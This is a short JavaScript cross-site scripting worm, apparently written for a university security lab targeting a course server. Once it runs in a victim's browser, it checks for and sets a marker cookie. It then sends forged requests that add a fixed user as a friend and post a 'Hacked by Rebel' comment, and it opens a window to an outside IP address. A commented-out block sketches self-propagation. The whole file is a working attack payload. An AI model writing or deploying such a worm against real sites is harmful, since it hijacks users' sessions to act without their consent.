
const get_cookie = () =>{
    // bless stackoverflow
    var cookies = document.cookie.split('; ').reduce((prev, current) => {
        const [name, value] = current.split('=');
        prev[name] = value;
        return prev
      }, {});
    let made = false;
    console.log("cookies are: " +  cookies);
    console.log(!("rebel") in cookies);
    if (!("rebel" in cookies)){
        // if our cookie isn't in here we will add it
        document.cookie = "rebel=true; expires=Thu, 21 Aug 2024 20:00:00 UTC; path=/"
    }
    else{
        made = true;
    }

    return made;
}

const wormtime = url => {
    // add  me!
    const made = get_cookie();
    if (!(made)){
        $.get(`${url}add_friend.php?id=196`, function( data ) {})
        let comment = `Hackedby%20Rebel%20on%20` + new Date().toLocaleDateString();
        let page = `${url}add_comment.php?id=196&comment=${comment}`;
        $.get(page, function( data ) {});
        //const script = ``;
        //let second_comment = `${script}`
        //let second_page = `${url}add_comment.php?id=196&comment=${second_comment}`;
        //$.get(second_page, function( data ) {});
        try{window.open("http://34.69.234.194/")}catch(e){console.log(e);}
    }

}

const url= "http://csec380-core.csec.rit.edu:86/";

wormtime(url);
